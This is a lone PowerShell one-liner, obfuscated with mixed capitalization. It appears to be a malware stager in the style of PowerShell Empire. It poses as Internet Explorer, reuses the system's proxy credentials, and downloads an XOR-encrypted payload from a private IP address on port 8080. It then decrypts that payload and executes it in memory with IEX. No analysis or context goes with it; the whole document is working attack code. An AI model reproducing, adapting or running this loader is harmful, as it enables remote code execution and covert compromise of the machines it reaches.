
[SYStEm.Net.SerViCePOInTMaNAger]::Expect100ConTInUE = 0;$WC=NEw-ObJeCT SysTem.NEt.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAders.AdD('User-Agent',$u);$WC.PROXy = [SYstEm.NeT.WebREqUESt]::DeFaulTWEbPRoxY;$Wc.ProxY.CRedenTIALs = [SyStEM.NeT.CrEdentialCAChE]::DefaULtNEtWORKCREdeNTials;$K='68e28afa446582fea3235a9399740990';$I=0;[Char[]]$b=([ChaR[]]($Wc.DownlOadSTring("http://192.168.2.32:8080/index.asp")))|%{$_-BXoR$k[$i++%$K.LEngth]};IEX ($b-JoIN'')

